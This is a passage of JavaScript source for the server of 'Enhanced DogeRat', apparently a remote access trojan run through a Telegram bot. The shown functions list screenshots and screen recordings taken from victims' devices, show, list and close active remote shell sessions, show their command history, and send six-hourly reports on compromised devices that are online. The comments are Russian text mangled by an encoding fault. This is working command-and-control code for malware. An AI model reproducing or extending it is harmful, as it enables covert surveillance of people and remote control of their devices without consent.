// –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è Screen Sharing
function showScreenshots(chatId) {
    const screenshots = screencastManager.getScreenshots();
    const message = screencastManager.formatScreenshotsForTelegram(screenshots);
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showRecordings(chatId) {
    const recordings = screencastManager.getRecordings();
    const message = screencastManager.formatRecordingsForTelegram(recordings);
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showStreamStats(chatId) {
    const message = screencastManager.formatStatsForTelegram();
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è Shell Access
function showActiveSessions(chatId) {
    const sessions = shellManager.getActiveSessions();
    
    if (sessions.length === 0) {
        bot.sendMessage(chatId, 
            'üêö <b>Active Shell Sessions</b>\n\nNo active sessions found.',
            { parse_mode: 'HTML', ...getMainMenu() }
        );
        return;
    }
    
    let message = 'üêö <b>Active Shell Sessions</b>\n\n';
    sessions.forEach((session, index) => {
        const uptime = Math.round(session.uptime / 1000);
        const lastActivity = Math.round((Date.now() - session.lastActivity) / 1000);
        
        message += `${index + 1}. <b>${session.id}</b>\n`;
        message += `   üì± Device: ${session.deviceId}\n`;
        message += `   ‚è±Ô∏è Uptime: ${uptime}s\n`;
        message += `   üïê Last activity: ${lastActivity}s ago\n`;
        message += `   ‚å®Ô∏è Commands: ${session.commandCount}\n\n`;
    });
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showShellHistory(chatId) {
    // –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω—é—é –∞–∫—Ç–∏–≤–Ω—É—é —Å–µ—Å—Å–∏—é –∏–ª–∏ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –≤—ã–±–æ—Ä
    const activeSessions = shellManager.getActiveSessions();
    
    if (activeSessions.length === 0) {
        bot.sendMessage(chatId,
            'üêö <b>Shell History</b>\n\nNo active sessions found.',
            { parse_mode: 'HTML', ...getMainMenu() }
        );
        return;
    }
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é –ø–µ—Ä–≤–æ–π –∞–∫—Ç–∏–≤–Ω–æ–π —Å–µ—Å—Å–∏–∏
    const sessionId = activeSessions[0].id;
    const message = shellManager.formatHistoryForTelegram(sessionId);
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function showAvailableCommands(chatId) {
    const message = shellManager.formatCommandsForTelegram();
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

function selectShellSessionToClose(chatId) {
    const sessions = shellManager.getActiveSessions();
    
    if (sessions.length === 0) {
        bot.sendMessage(chatId,
            'üêö <b>Close Session</b>\n\nNo active sessions to close.',
            { parse_mode: 'HTML', ...getMainMenu() }
        );
        return;
    }
    
    const keyboard = sessions.map(session => [`üîí ${session.id}`]);
    keyboard.push(['‚ùå Cancel']);
    
    appData.set('currentAction', 'close_shell_session');
    bot.sendMessage(chatId,
        'üîí <b>Select Session to Close</b>\n\nChoose a session:',
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        }
    );
}

function showShellStats(chatId) {
    const message = shellManager.formatStatsForTelegram();
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –æ—Ç—á–µ—Ç—ã (–∫–∞–∂–¥—ã–µ 6 —á–∞—Å–æ–≤)
setInterval(() => {
    const onlineCount = Array.from(deviceSessions.values()).filter(s => s.status === 'online').length;
    const todayCommands = commandHistory.filter(c => 
        c.timestamp.toDateString() === new Date().toDateString()
    ).length;
    
    const report = `üìä <b>Automatic Report</b>\n\n` +
        `üì± Online devices: ${onlineCount}\n` +
        `üìù Commands today: ${todayCommands}\n` +
        `‚è∞ Time: ${new Date().toLocaleString()}`;
    
    bot.sendMessage(data.id, report, { parse_mode: 'HTML' });
}, 6 * 60 * 60 * 1000); // 6 —á–∞—Å–æ–≤

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`üöÄ Enhanced DogeRat server running on port ${PORT}`);
    console.log(`üì± Telegram bot active`);
    console.log(`üîß Enhanced features enabled`);
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    bot.sendMessage(data.id, `‚ùå Server Error: ${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    bot.sendMessage(data.id, `‚ùå Server Warning: Unhandled promise rejection`);
});